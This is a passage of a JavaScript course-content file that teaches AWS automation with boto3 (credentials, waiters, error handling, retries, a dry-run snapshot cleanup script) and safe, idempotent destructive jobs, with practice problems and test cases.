      cx: `<p>O(P + K): one call per page P and one append per key K. Memory is O(K) for the returned list; a generator version would use O(page size).</p>`,
      f: ['Rewrite it as a generator that yields keys, and stop after the first key ending in ".tmp".', 'How would you protect against a buggy API that returns the same token forever?'],
      tests: { sig: 'string[][] -> string[]', fn: 'collectKeys', cases: [
        [[[['a', 'b'], ['c']]], ['a', 'b', 'c']],
        [[[[]]], []],
        [[[['x']]], ['x']],
        [[[['a'], [], ['b']]], ['a', 'b']],
        [[[['k1', 'k2', 'k3'], ['k4', 'k5', 'k6'], ['k7']]], ['k1', 'k2', 'k3', 'k4', 'k5', 'k6', 'k7']],
        [[[[], [], []]], []],
        [[[['logs/2026/01.gz'], ['logs/2026/02.gz'], ['logs/2026/03.gz'], ['logs/2026/04.gz']]], ['logs/2026/01.gz', 'logs/2026/02.gz', 'logs/2026/03.gz', 'logs/2026/04.gz']],
        [[[[], ['late']]], ['late']]
      ] }
    })]
  });

  // ───────────────────────── Topic 5: boto3 ─────────────────────────
  topics.push({
    title: 'AWS Automation with boto3: Sessions, Credentials, Waiters, Retries and ClientError',
    analogy: `<p>boto3 is a <b>universal remote control for AWS</b>. The <b>session</b> is the remote's battery and settings: which account (profile or role) and which region it points at. A <b>client</b> is one set of buttons, for one service (EC2, S3). A <b>paginator</b> is the "next page" button you met earlier. A <b>waiter</b> is the "wait until the TV is on" button: it keeps checking politely every few seconds instead of you pressing the power button again and again. And when something goes wrong, AWS does not just say "error": it hands you a <b>labelled error card</b> (<code>e.response["Error"]["Code"]</code>) so you can react to "already deleted" differently from "access denied".</p>`,
    explain: `<p>🟢 <b>Credentials: never in the code.</b> boto3 finds credentials on its own by walking the <b>default credential chain</b>. You only choose <i>which</i> identity with a profile name or by where the script runs:</p>
      ${H.table(['Where the script runs', 'How it gets credentials', 'What you write'], [
        ['your laptop', 'a profile in <code>~/.aws/config</code>, ideally IAM Identity Center (SSO): <code>aws sso login --profile sandbox</code>', '<code>boto3.Session(profile_name="sandbox")</code> or <code>AWS_PROFILE=sandbox</code>'],
        ['an EC2 instance', 'the instance profile (role) via the metadata service (IMDSv2)', '<code>boto3.Session()</code>: nothing else'],
        ['ECS, Lambda, EKS', 'the task role, execution role, or IRSA / Pod Identity', '<code>boto3.Session()</code>'],
        ['CI (GitHub Actions)', 'OIDC: the pipeline assumes a role for a short time', '<code>boto3.Session()</code> after the login step'],
        ['another account', '<code>sts.assume_role</code>, or a profile with <code>role_arn</code> + <code>source_profile</code>', 'a session built from the temporary keys']
      ])}
      <p>${H.c('r', 'Never')} write <code>aws_access_key_id="AKIA..."</code> in a script: keys in Git get found by bots within minutes. Long-lived access keys should be rare; roles hand out short-lived credentials automatically.</p>
      <p>🟢 <b>Clients.</b> <code>ec2 = session.client("ec2", region_name="eu-west-1")</code>. Every AWS API action is a method in snake_case: <code>DescribeSnapshots</code> → <code>ec2.describe_snapshots(...)</code>, with parameters in the API's own CamelCase. Responses are plain dicts (the same JSON you saw in the CLI). boto3 also has older "resources" (<code>boto3.resource("ec2")</code>); AWS has frozen them, so new code should use clients.</p>
      <p>🔵 <b>Waiters.</b> Many actions are asynchronous: <code>run_instances</code> returns while the instance is still <code>pending</code>. <code>ec2.get_waiter("instance_running").wait(InstanceIds=[iid])</code> polls <code>describe_instances</code> every 15 s, up to 40 times, and raises <code>WaiterError</code> if the instance ends up in a bad state or time runs out. Other useful waiters: <code>snapshot_completed</code>, <code>image_available</code>, <code>bucket_exists</code>, <code>db_instance_available</code>.</p>
      <p>🔵 <b>Errors.</b> Almost every AWS failure is a <code>botocore.exceptions.ClientError</code>. Read the code, then decide:</p>
      ${H.table(['Error code (examples)', 'Meaning', 'Typical reaction'], [
        ['<code>InvalidSnapshot.NotFound</code>, <code>NoSuchKey</code>', 'already gone', 'fine for a cleanup: count as done'],
        ['<code>InvalidSnapshot.InUse</code>', 'an AMI still uses it', 'skip and report'],
        ['<code>UnauthorizedOperation</code>, <code>AccessDenied</code>', 'IAM does not allow it', 'stop: retrying will not help'],
        ['<code>DryRunOperation</code>', 'with <code>DryRun=True</code>: "this would have worked"', 'treat as success in dry-run mode'],
        ['<code>RequestLimitExceeded</code>, <code>Throttling</code>', 'too many calls', 'the SDK retries; slow down']
      ])}
      <p>🔵 <b>Retries.</b> Turn on the SDK's <b>standard</b> retry mode: <code>Config(retries={"mode": "standard", "max_attempts": 10})</code>. It retries throttling and transient errors with exponential backoff and jitter, so you do not write your own loop around AWS calls.</p>`,
    clues: [
      '"how does your script authenticate to AWS?" → default credential chain: profile/SSO locally, role on EC2/ECS/Lambda, OIDC in CI; never keys in code',
      '"wait until the instance is running / the snapshot completes" → <code>get_waiter(...)</code> with a WaiterConfig, not <code>time.sleep</code> in a loop',
      '"handle the case where it was already deleted" → catch <code>ClientError</code> and branch on <code>e.response["Error"]["Code"]</code>',
      '"we get ThrottlingException / RequestLimitExceeded" → <code>Config(retries={"mode": "standard"})</code> or adaptive, fewer parallel workers',
      '"run against every account in the organisation" → <code>sts.assume_role</code> into a read-only role per account',
      '"make sure it never runs against prod by mistake" → check <code>sts.get_caller_identity()["Account"]</code> before doing anything'
    ],
    code: [R`#!/usr/bin/env python3
"""clean_snapshots.py - delete UNTAGGED EBS snapshots older than N days.

Dry run by default. Deleting needs BOTH --apply and --yes, and the account must match --account.
  AWS_PROFILE=sandbox clean_snapshots.py --account 123456789012 --region eu-west-1 --days 30
  AWS_PROFILE=sandbox clean_snapshots.py --account 123456789012 --region eu-west-1 --days 30 --apply --yes
Needs: ec2:DescribeSnapshots, ec2:DeleteSnapshot, sts:GetCallerIdentity.
"""
import argparse
import logging
import sys
from datetime import datetime, timedelta, timezone

import boto3
from botocore.config import Config
from botocore.exceptions import ClientError

log = logging.getLogger("clean_snapshots")
RETRIES = Config(retries={"mode": "standard", "max_attempts": 10})


def parse_args(argv=None):
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--account", required=True, help="expected AWS account id (safety check)")
    p.add_argument("--region", required=True)
    p.add_argument("--profile", help="AWS profile; default: the normal credential chain")
    p.add_argument("--days", type=int, default=30)
    p.add_argument("--apply", action="store_true", help="really delete (default: dry run)")
    p.add_argument("--yes", action="store_true", help="confirm deletion; required with --apply")
    args = p.parse_args(argv)
    if args.apply and not args.yes:
        p.error("--apply deletes snapshots; add --yes to confirm")
    if args.days < 1:
        p.error("--days must be at least 1")
    return args


def stale_untagged(ec2, days):
    """Yield snapshots we own that have no tags and are older than days."""
    cutoff = datetime.now(timezone.utc) - timedelta(days=days)   # StartTime is timezone-aware UTC
    for page in ec2.get_paginator("describe_snapshots").paginate(OwnerIds=["self"]):
        for snap in page["Snapshots"]:
            if not snap.get("Tags") and snap["StartTime"] < cutoff:
                yield snap


def main(argv=None):
    args = parse_args(argv)
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    session = boto3.Session(profile_name=args.profile, region_name=args.region)

    account = session.client("sts").get_caller_identity()["Account"]
    if account != args.account:
        log.error("credentials are for account %s, expected %s: refusing to run", account, args.account)
        return 2

    ec2 = session.client("ec2", config=RETRIES)
    deleted, skipped, failed = 0, 0, 0
    for snap in stale_untagged(ec2, args.days):
        sid, age = snap["SnapshotId"], (datetime.now(timezone.utc) - snap["StartTime"]).days
        if not args.apply:
            log.info("WOULD delete %s (%d days, %d GiB)", sid, age, snap["VolumeSize"])
            continue
        try:
            ec2.delete_snapshot(SnapshotId=sid)
            log.info("deleted %s (%d days)", sid, age)
            deleted += 1
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "InvalidSnapshot.NotFound":
                log.info("%s already gone", sid)                 # idempotent: someone beat us to it
            elif code == "InvalidSnapshot.InUse":
                log.warning("%s is used by an AMI, skipping", sid)
                skipped += 1
            elif code in ("UnauthorizedOperation", "AccessDenied"):
                log.error("not allowed to delete snapshots: %s", e)
                return 1                                          # pointless to continue
            else:
                log.error("%s failed: %s %s", sid, code, e.response["Error"].get("Message"))
                failed += 1
    log.info("done: deleted=%d skipped=%d failed=%d mode=%s", deleted, skipped, failed,
             "APPLY" if args.apply else "DRY RUN")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())`, R`"""Launch a test instance, wait for it properly, tag it, and clean up. Shows waiters and DryRun."""
import boto3
from botocore.config import Config
from botocore.exceptions import ClientError, WaiterError

session = boto3.Session(profile_name="sandbox", region_name="eu-west-1")
ec2 = session.client("ec2", config=Config(retries={"mode": "standard", "max_attempts": 10}))

# 1. Permission check without side effects: DryRun=True answers "would this work?"
try:
    ec2.run_instances(ImageId="ami-0abcdef1234567890", InstanceType="t3.micro",
                      MinCount=1, MaxCount=1, DryRun=True)
except ClientError as e:
    if e.response["Error"]["Code"] != "DryRunOperation":     # DryRunOperation = allowed
        raise

# 2. The real call returns immediately; the instance is still 'pending'.
resp = ec2.run_instances(
    ImageId="ami-0abcdef1234567890", InstanceType="t3.micro", MinCount=1, MaxCount=1,
    TagSpecifications=[{"ResourceType": "instance",
                        "Tags": [{"Key": "Owner", "Value": "team-a"}, {"Key": "Purpose", "Value": "smoke-test"}]}],
    ClientToken="smoke-test-2026-10-19",                     # idempotency: a retry will not launch a second one
)
iid = resp["Instances"][0]["InstanceId"]

# 3. Wait the right way: poll every 10 s, give up after 5 minutes.
try:
    ec2.get_waiter("instance_running").wait(InstanceIds=[iid], WaiterConfig={"Delay": 10, "MaxAttempts": 30})
    ec2.get_waiter("instance_status_ok").wait(InstanceIds=[iid])
    print(iid, "is running and healthy")
finally:
    ec2.terminate_instances(InstanceIds=[iid])                # always clean up the test instance
    try:
        ec2.get_waiter("instance_terminated").wait(InstanceIds=[iid])
    except WaiterError as e:
        print("termination not confirmed:", e)`],
    codeTitle: ['clean_snapshots.py: untagged snapshots older than 30 days, dry run by default', 'Waiters, DryRun and ClientToken on a test instance'],
    viz: [{
      title: 'Where does boto3 find credentials? (simplified chain)',
      input: 'profile,role',
      inputLabel: 'sources that exist: code, env, profile, container, role (comma-separated)',
      gen: function (input) {
        var have = csv(input).map(function (x) { return x.toLowerCase(); });
        var ok = ['code', 'env', 'profile', 'container', 'role'];
        if (have.some(function (x) { return ok.indexOf(x) < 0; })) throw new Error('Use only: code, env, profile, container, role');
        var chain = [
          ['code', 'keys passed in code', 'aws_access_key_id=... in boto3.client() or Session()', 'Works, but keys in code end up in Git. Never do this.'],
          ['env', 'environment variables', 'AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY (/ AWS_SESSION_TOKEN), or AWS_ROLE_ARN + web identity token (EKS IRSA)', 'Common in CI; short-lived values only.'],
          ['profile', 'shared config files', '~/.aws/config and ~/.aws/credentials: SSO profiles, assume-role profiles, keys', 'The normal choice on a laptop: aws sso login.'],
          ['container', 'container credentials', 'ECS task role / EKS Pod Identity endpoint', 'Automatic inside ECS tasks and Pod Identity pods.'],
          ['role', 'instance metadata (IMDSv2)', 'the EC2 instance profile role', 'Automatic on EC2; no secrets on disk at all.']
        ];
        var nodes = chain.map(function (c, i) { return box(c[0], (i + 1) + '. ' + c[1], 50, 6 + i * 13, 44); });
        var f = [];
        f.push({ narr: 'You wrote <code>boto3.Session()</code> with no keys. boto3 now checks providers <b>in order</b> and uses the <b>first</b> one that has credentials. Sources present on this machine: <b>' + (have.join(', ') || 'none') + '</b>.', parts: [
          { type: 'graph', label: 'credential chain', height: 70, nodes: nodes, edges: [['code', 'env'], ['env', 'profile'], ['profile', 'container'], ['container', 'role']], tags: (function () { var t = {}; have.forEach(function (h) { t[h] = 'present'; }); return t; })() }
        ] });
        var found = null;
        for (var i = 0; i < chain.length; i++) {
          var c = chain[i], hl = {};
          for (var j = 0; j < i; j++) hl[chain[j][0]] = 'done';
          if (have.indexOf(c[0]) >= 0) {
            hl[c[0]] = c[0] === 'code' ? 'bad' : 'ok';
            found = c;
            f.push({ narr: 'Step ' + (i + 1) + ': <b>' + c[1] + '</b> (' + H.esc(c[2]) + ') has credentials. <b>Stop here</b>; later sources are never looked at. ' + c[3], parts: [
              { type: 'graph', label: 'credential chain', height: 70, nodes: nodes, edges: [['code', 'env'], ['env', 'profile'], ['profile', 'container'], ['container', 'role']], hl: hl }
            ] });
            break;
          }
          hl[c[0]] = 'cur';
          f.push({ narr: 'Step ' + (i + 1) + ': <b>' + c[1] + '</b>? Nothing there, move on.', parts: [
            { type: 'graph', label: 'credential chain', height: 70, nodes: nodes, edges: [['code', 'env'], ['env', 'profile'], ['profile', 'container'], ['container', 'role']], hl: hl }
          ] });
        }
        if (!found) f.push({ narr: 'No provider had credentials, so the first API call raises <code>NoCredentialsError: Unable to locate credentials</code>. Fix: <code>aws sso login --profile ...</code> locally, or attach a role where the script runs.', parts: [{ type: 'text', html: H.c('r', 'botocore.exceptions.NoCredentialsError') }] });
        else f.push({ narr: 'A classic surprise: if <b>env</b> variables are set (an old exported key), they win over your profile and even over the instance role. Run <code>aws sts get-caller-identity</code> (or <code>sts.get_caller_identity()</code> in the script) to see which identity is really in use, and check the account id before changing anything.', parts: [
          { type: 'vars', label: 'used identity', vals: { source: found[1], 'check with': 'sts.get_caller_identity()', 'example account': '123456789012' }, hl: { source: found[0] === 'code' ? 'bad' : 'ok' } }
        ] });
        return pad4(f, 'Try other combinations, for example env,role or just role.');
      }
    }, {
      title: 'A waiter polling instance_running',
      input: 'pending,pending,pending,running',
      inputLabel: 'state seen at each poll: pending, running, shutting-down, terminated, stopped',
      gen: function (input) {
        var st = csv(input);
        var OK = ['pending', 'running', 'shutting-down', 'terminated', 'stopped', 'stopping'];
        if (!st.length || st.length > 12 || st.some(function (s) { return OK.indexOf(s) < 0; })) throw new Error('Use 1-12 of: pending, running, stopping, stopped, shutting-down, terminated');
        var delay = 15, maxA = 40, f = [], waited = 0;
        f.push({ narr: '<code>get_waiter("instance_running").wait(InstanceIds=[iid])</code> calls <code>describe_instances</code> every <b>' + delay + ' s</b>, at most <b>' + maxA + '</b> times (10 minutes). Success when the state is <code>running</code>; immediate failure on <code>shutting-down</code>, <code>terminated</code> or <code>stopping</code>.', parts: [
          { type: 'array', label: 'states the API will report', values: st }
        ] });
        for (var i = 0; i < st.length; i++) {
          var s = st[i], hl = {};
          for (var j = 0; j < i; j++) hl[j] = 'done';
          if (s === 'running') {
            hl[i] = 'ok';
            f.push({ narr: 'Poll ' + (i + 1) + ': <b>running</b>. The waiter returns. Total wait ≈ <b>' + waited + ' s</b>. Your script continues to the next step (for example a health check).', parts: [{ type: 'array', label: 'polls', values: st, hl: hl }, { type: 'vars', label: 'waiter', vals: { poll: String(i + 1), waited: waited + ' s', result: 'success' }, hl: { result: 'ok' } }] });
            return f;
          }
          if (s === 'pending' || s === 'stopped') {
            hl[i] = 'cur';
            f.push({ narr: 'Poll ' + (i + 1) + ': <b>' + s + '</b>. Not there yet and not a failure state, so sleep ' + delay + ' s and ask again. No hand-written <code>while True: sleep</code> loop needed.', parts: [{ type: 'array', label: 'polls', values: st, hl: hl }, { type: 'vars', label: 'waiter', vals: { poll: String(i + 1), waited: waited + ' s', result: 'waiting' } }] });
            waited += delay;
            continue;
          }
          hl[i] = 'bad';
          f.push({ narr: 'Poll ' + (i + 1) + ': <b>' + s + '</b>. This is a failure state for <code>instance_running</code>, so the waiter raises <code>WaiterError: Waiter InstanceRunning failed: Waiter encountered a terminal failure state</code> at once instead of waiting ten minutes. Catch it, log the instance\'s <code>StateReason</code>, and clean up.', parts: [{ type: 'array', label: 'polls', values: st, hl: hl }, { type: 'vars', label: 'waiter', vals: { poll: String(i + 1), waited: waited + ' s', result: 'WaiterError' }, hl: { result: 'bad' } }] });
          return f;
        }
        f.push({ narr: 'Still not running after these polls. The waiter keeps going until attempt ' + maxA + ', then raises <code>WaiterError: Max attempts exceeded</code>. Tune it with <code>WaiterConfig={"Delay": 10, "MaxAttempts": 30}</code>.', parts: f[f.length - 1].parts });
        return pad4(f, 'Add more states.');
      }
    }],
    examples: [
      { title: 'Timezone-aware dates: the age filter that crashed', html: `<p>boto3 returns <code>StartTime</code> and <code>LaunchTime</code> as <b>timezone-aware</b> UTC datetimes. Comparing them with <code>datetime.now()</code> (naive, local time) raises <code>TypeError: can't compare offset-naive and offset-aware datetimes</code>. Older code used <code>datetime.utcnow()</code>, which is naive too and deprecated since Python 3.12. Always use <code>datetime.now(timezone.utc)</code>. This demo uses the same kind of values boto3 returns.</p>`, code: { lang: 'python', run: true, code: R`from datetime import datetime, timedelta, timezone

snapshots = [   # shaped like describe_snapshots output; StartTime is tz-aware, as in boto3
    {"SnapshotId": "snap-0aaa", "StartTime": datetime(2026, 8, 2, 3, 0, tzinfo=timezone.utc), "Tags": []},
    {"SnapshotId": "snap-0bbb", "StartTime": datetime(2026, 10, 15, 3, 0, tzinfo=timezone.utc)},
    {"SnapshotId": "snap-0ccc", "StartTime": datetime(2026, 7, 1, 3, 0, tzinfo=timezone.utc),
     "Tags": [{"Key": "Owner", "Value": "team-db"}]},
]
now = datetime(2026, 10, 19, 12, 0, tzinfo=timezone.utc)      # fixed "now" so the output is stable

try:
    snapshots[0]["StartTime"] < datetime(2026, 10, 19)         # naive vs aware
except TypeError as e:
    print("TypeError:", e)

cutoff = now - timedelta(days=30)
for s in snapshots:
    age = (now - s["StartTime"]).days
    stale = not s.get("Tags") and s["StartTime"] < cutoff
    print(f"{s['SnapshotId']}  age={age:3d}d  tags={len(s.get('Tags', []))}  {'DELETE' if stale else 'keep'}")
# Output:
# TypeError: can't compare offset-naive and offset-aware datetimes
# snap-0aaa  age= 78d  tags=0  DELETE
# snap-0bbb  age=  4d  tags=0  keep
# snap-0ccc  age=110d  tags=1  keep` } },
      { title: 'Assume a role in another account (no stored keys)', html: `<p>To audit every account in an organisation, run in a central account and <b>assume</b> a read-only role in each target. STS returns temporary keys (default 1 hour) that you feed into a new session. The role's trust policy decides who may assume it; an <code>ExternalId</code> or source-account condition protects against the confused-deputy problem.</p>`, code: R`import boto3


def session_for(account_id, role="OrgReadOnly", region="eu-west-1"):
    creds = boto3.client("sts").assume_role(
        RoleArn=f"arn:aws:iam::{account_id}:role/{role}",
        RoleSessionName="snapshot-audit",            # shows up in CloudTrail: who did what
        DurationSeconds=3600,
    )["Credentials"]
    return boto3.Session(aws_access_key_id=creds["AccessKeyId"],      # temporary keys from STS,
                         aws_secret_access_key=creds["SecretAccessKey"],  # never typed or stored
                         aws_session_token=creds["SessionToken"],
                         region_name=region)


s = session_for("123456789012")
print(s.client("sts").get_caller_identity()["Arn"])` },
      { title: 'Modeled exceptions vs error codes', html: `<p>Some services expose named exceptions on the client, for example <code>s3.exceptions.NoSuchBucket</code> or <code>iam.exceptions.NoSuchEntityException</code>. They are subclasses of <code>ClientError</code>, so both styles work. Error <b>codes</b> are the universal fallback: EC2, for instance, models almost none of its errors, so you compare <code>e.response["Error"]["Code"]</code>. Also log <code>e.response["ResponseMetadata"]["RequestId"]</code>: AWS Support asks for it.</p>`, code: R`import boto3
from botocore.exceptions import ClientError

s3 = boto3.Session(profile_name="sandbox").client("s3")
try:
    s3.head_bucket(Bucket="app-logs-123456789012")
except ClientError as e:
    code = e.response["Error"]["Code"]                 # head_bucket gives "404" / "403" (no body)
    request_id = e.response["ResponseMetadata"]["RequestId"]
    if code in ("404", "NoSuchBucket"):
        print("bucket missing; create it")
    elif code in ("403", "AccessDenied"):
        print("exists but we may not use it (or it is someone else's)", request_id)
    else:
        raise` }
    ],
    deepDive: `<p>🟣 <b>Sessions and threads.</b> A <code>boto3.Session</code> is <b>not</b> thread-safe; clients <b>are</b>. In a thread pool, create the session (or at least the client) up front and share the client, or build one session per thread. Module-level <code>boto3.client(...)</code> uses a hidden default session, which is fine for simple scripts but awkward for multi-account code; pass sessions explicitly.</p>
      <p><b>Retry modes.</b> <code>legacy</code> (old default: 5 attempts, limited error list), <code>standard</code> (3 attempts by default, exponential backoff with jitter, a wider list of transient errors, and a client-side retry quota so a failing service does not cause a retry storm) and <code>adaptive</code> (standard plus client-side rate limiting; experimental, useful for heavy batch jobs). You can also set it without code: <code>AWS_RETRY_MODE=standard</code>, <code>AWS_MAX_ATTEMPTS=10</code>. boto3's long-time default has been legacy, so set standard explicitly: it documents your intent and behaves the same on every machine.</p>
      <p><b>Timeouts.</b> botocore defaults to 60 s connect and 60 s read. For scripts that make thousands of small calls, <code>Config(connect_timeout=5, read_timeout=30)</code> fails faster. Set <code>max_pool_connections</code> at least as large as your thread count, or threads queue for a connection.</p>
      <p><b>Waiter internals.</b> Waiters are defined in JSON models: an operation to call, a delay, max attempts and "acceptors" (matchers on response fields or error codes that mean success, failure or retry). <code>WaiterError</code> carries <code>last_response</code>, which you should log. Waiters are polling, so they cost API calls: for long jobs (a 2-hour snapshot) prefer EventBridge events over a script that waits.</p>
      <p><b>Ownership and blast radius.</b> Snapshot cleanups must filter <code>OwnerIds=["self"]</code>, skip snapshots referenced by AMIs (or catch <code>InvalidSnapshot.InUse</code>), and respect AWS Backup / DLM-managed snapshots (often recognisable by tags such as <code>aws:backup:source-resource</code>; as <code>aws:</code> tags they also make the snapshot "tagged"). For production, AWS Data Lifecycle Manager or AWS Backup retention rules are usually better than a custom script; the script is for the untagged leftovers they do not own. Also consider the <b>Recycle Bin</b> retention rule for snapshots, which makes accidental deletes recoverable for a set period.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants know boto3's huge API surface far better than anyone's memory: which call lists what, which parameters exist, which waiters are available. "Write a boto3 script that finds unattached EBS volumes in all regions" gives a solid first draft in seconds. AWS's own tools (Amazon Q Developer and similar) can also generate IAM policies for a script.</p>
      <p><b>Where it goes wrong:</b> generated code frequently contains placeholder keys (<code>aws_access_key_id="YOUR_KEY"</code>) that people fill in with real ones, uses <code>datetime.now()</code> against aware timestamps, forgets <code>OwnerIds=["self"]</code>, skips pagination, catches every exception with one generic message, and deletes by default. Some invent parameters or waiter names. <b>Your job:</b> check every call against the boto3 docs, run with <code>DryRun=True</code> or the script's dry-run mode in a sandbox account (123456789012-style, not prod), add the account-id guard, and give the role the narrowest IAM policy possible. If an AI agent runs AWS commands for you, it gets a read-only role by default and a human approves anything destructive.</p>`,
    problems: [P({
      t: 'Pick the untagged snapshots older than N days', l: 'Medium', tags: ['boto3', 'datetime', 'timezones', 'snapshots', 'pure function'], co: ['Amazon', 'Capital One', 'Freshworks'], c: PURE,
      s: `<p>The cleanup script's core decision should be a pure function you can test without AWS. Write <code>stale_snapshots(ids, start_times, tag_counts, now, days)</code>. The three lists are parallel: snapshot <code>ids[i]</code> was started at <code>start_times[i]</code> (an ISO 8601 string with a timezone, either <code>+HH:MM</code> or <code>Z</code>) and has <code>tag_counts[i]</code> tags. <code>now</code> is an ISO string too. Return, in input order, the ids that have <b>zero tags</b> and are <b>strictly older</b> than <code>days</code> days, meaning <code>start &lt; now − days</code>.</p>`,
      ex: `<p>Now is <code>2026-10-19T00:00:00+00:00</code>, days = 30, so the cutoff is <code>2026-09-19T00:00:00Z</code>. A snapshot started at exactly the cutoff is ${H.c('y', 'kept')} (not strictly older). One started at <code>2026-09-19T01:00:00+02:00</code> is ${H.c('r', 'deleted')}: in UTC that is 2026-09-18 23:00, an hour before the cutoff.</p>`,
      bw: `<p>Comparing the timestamps as <b>strings</b>, or cutting off the timezone and comparing naive datetimes. String comparison breaks as soon as offsets differ (<code>+02:00</code> vs <code>Z</code>), and dropping the offset shifts ages by hours, which matters exactly at the boundary. Using <code>&lt;=</code> instead of <code>&lt;</code> deletes snapshots that are exactly 30 days old, against the policy.</p>`,
      bc: `def stale_snapshots(ids, start_times, tag_counts, now, days):
    cutoff = now[:10]                                  # compares text: ignores time and timezone
    return [i for i, t, n in zip(ids, start_times, tag_counts) if n == 0 and t[:10] < cutoff]`,
      q: ['Which "now" should a script compare with boto3\'s StartTime?', ['<code>datetime.now(timezone.utc)</code>', '<code>datetime.now()</code>', '<code>datetime.utcnow()</code>', '<code>time.time()</code>'], 0, 'boto3 timestamps are aware UTC datetimes. datetime.now() and utcnow() are naive (utcnow is also deprecated) and raise TypeError when compared; time.time() is a float, not a datetime.'],
      h: ['<p>Hint 1: <code>datetime.fromisoformat()</code> parses both <code>+00:00</code> and <code>Z</code> (Python 3.11+) into aware datetimes, so comparisons are correct across offsets.</p>', '<p>Hint 2: compute the cutoff once: <code>cutoff = parse(now) - timedelta(days=days)</code>.</p>', '<p>Hint 3: loop over <code>zip(ids, start_times, tag_counts)</code> and keep an id when <code>count == 0 and parse(start) &lt; cutoff</code>. Empty lists return an empty list.</p>'],
      a: `<p>Parse every timestamp into an <b>aware</b> datetime so that offsets are applied, compute one cutoff (now minus <code>days</code>), and filter. Keeping the decision in a pure function means the real script only adds the AWS parts: a paginator that yields snapshots and a delete call. Tests can pin the boundary cases that matter in production: exactly at the cutoff, one second past it, and different timezone offsets. In the real script, <code>now</code> comes from <code>datetime.now(timezone.utc)</code> and the times are already datetimes from boto3, so the parsing step disappears.</p>`,
      code: `from datetime import datetime, timedelta


def stale_snapshots(ids, start_times, tag_counts, now, days):
    """Ids with no tags whose start time is strictly older than now - days."""
    cutoff = datetime.fromisoformat(now) - timedelta(days=days)
    stale = []
    for sid, started, n_tags in zip(ids, start_times, tag_counts):
        if n_tags == 0 and datetime.fromisoformat(started) < cutoff:   # aware vs aware: offsets applied
            stale.append(sid)
    return stale`,
      cx: `<p>O(n) for n snapshots: one parse and one comparison each.</p>`,
      f: ['Add a <code>keep_tags</code> rule: never delete a snapshot whose tags include <code>Retain=true</code>, even if the count rule changes.', 'How would you also skip snapshots that are referenced by a registered AMI?'],
      tests: { sig: 'string[] string[] int[] string int -> string[]', fn: 'staleSnapshots', cases: [
        [[['snap-a', 'snap-b', 'snap-c'], ['2026-09-01T10:00:00+00:00', '2026-10-10T00:00:00+00:00', '2026-08-01T00:00:00Z'], [0, 0, 2], '2026-10-19T00:00:00+00:00', 30], ['snap-a']],
        [[['snap-edge', 'snap-old'], ['2026-09-19T00:00:00+00:00', '2026-09-18T23:59:59+00:00'], [0, 0], '2026-10-19T00:00:00+00:00', 30], ['snap-old']],
        [[['snap-tz'], ['2026-09-19T01:00:00+02:00'], [0], '2026-10-19T00:00:00+00:00', 30], ['snap-tz']],
        [[[], [], [], '2026-10-19T00:00:00+00:00', 30], []],
        [[['s1', 's2', 's3'], ['2026-10-18T00:00:00Z', '2026-10-01T00:00:00Z', '2025-01-01T00:00:00Z'], [0, 1, 0], '2026-10-19T00:00:00+00:00', 0], ['s1', 's3']],
        [[['s1', 's2'], ['2020-01-01T00:00:00Z', '2021-01-01T00:00:00Z'], [3, 1], '2026-10-19T00:00:00+00:00', 30], []],
        [[['w1', 'w2', 'w3'], ['2026-10-11T23:59:59Z', '2026-10-12T00:00:00Z', '2026-10-12T00:00:01Z'], [0, 0, 0], '2026-10-19T00:00:00Z', 7], ['w1']],
        [[['snap-west'], ['2026-09-18T20:00:00-05:00'], [0], '2026-10-19T00:00:00Z', 30], []]
      ] }
    })]
  });

  // ───────────────────────── Topic 6: idempotency and safe destructive automation ─────────────────────────
  topics.push({
    title: 'Idempotency and Safety: Reconcilers, Dry Runs, Confirmations and Cron-Safe Jobs',
    analogy: `<p>Compare a <b>thermostat</b> with a <b>heater switch</b>. "Turn the heater on for 10 minutes" gives a different room every time you do it twice. "Make the room 21 °C" is safe to repeat all day: the thermostat looks at the room, compares it with the goal, and only acts on the difference. An idempotent script is a thermostat. It describes the <b>goal</b> ("every instance has an Owner tag"), checks what is already true, and changes only what is missing, so running it again after a crash, or from cron every hour, is harmless. The dry run is the thermostat's display that says "I would heat by 2 degrees" before it does anything.</p>`,
    explain: `<p>🟢 <b>Idempotent</b> means running it once or ten times leaves the same end state, and a run with nothing to do changes nothing. You practised this in bash (<code>mkdir -p</code>, "grep before append"). In Python against APIs the pattern has a name: the <b>reconciler</b> (or "ensure" function):</p>
      <ol>
        <li><b>Desired state:</b> what should be true, from config (for example "each instance has <code>Owner</code> and <code>CostCenter</code> tags").</li>
        <li><b>Observe:</b> read what is true now (with pagination!).</li>
        <li><b>Diff → plan:</b> a list of changes needed. Empty list = nothing to do.</li>
        <li><b>Show the plan</b> (dry run), and only with explicit confirmation <b>apply</b> it.</li>
        <li><b>Report</b> counts: planned, applied, failed. Exit non-zero if anything failed.</li>
      </ol>
      <p>This is exactly how Terraform (<code>plan</code> / <code>apply</code>), Ansible ("changed: 0") and Kubernetes controllers work, so learning it here pays off in later modules.</p>
      <p>🟢 <b>Safety rules for anything destructive</b> (delete, terminate, overwrite, revoke):</p>
      ${H.table(['Rule', 'How in Python'], [
        ['Dry run is the <b>default</b>', '<code>--apply</code> flag (<code>store_true</code>), off unless given'],
        ['Explicit confirmation', '<code>--yes</code> required together with <code>--apply</code>, or an interactive "type the account id to continue" prompt'],
        ['Right target', 'check <code>sts.get_caller_identity()["Account"]</code> equals <code>--account</code>; refuse on mismatch'],
        ['Limit the blast radius', '<code>--max-changes 50</code>: if the plan is bigger, stop and ask a human (a bug in the filter looks like "delete everything")'],
        ['Allow-list, not deny-list', 'act only on resources matching explicit rules; skip anything protected (tags like <code>Retain=true</code>)'],
        ['Audit trail', 'log every change with resource id and before/after values']
      ])}
      <p>🔵 <b>Cron-run jobs</b> have two extra problems: <b>overlap</b> (the 02:00 run is still going when the 03:00 run starts) and <b>partial failure</b> (the job died halfway last night). Solve the first with a lock (<code>fcntl.flock</code>, the same idea as bash <code>flock</code>); solve the second by making every step a reconcile step, so tonight's run simply finishes what is left. Avoid "process the next 100 items from my position file" designs unless the position is written atomically after each batch.</p>
